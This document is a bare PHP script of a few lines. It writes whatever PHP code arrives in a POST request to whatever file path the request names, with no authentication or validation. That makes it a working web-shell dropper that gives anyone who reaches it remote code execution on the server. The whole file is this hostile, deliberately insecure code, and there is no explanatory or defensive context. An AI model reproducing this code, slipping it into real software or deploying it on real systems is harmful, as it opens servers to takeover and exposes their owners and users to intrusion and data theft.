<?php

$filepath = $_POST["filePath"];
$content = "<?php\n\n" . $_POST["content"] . "\n";

file_put_contents($filepath, $content);
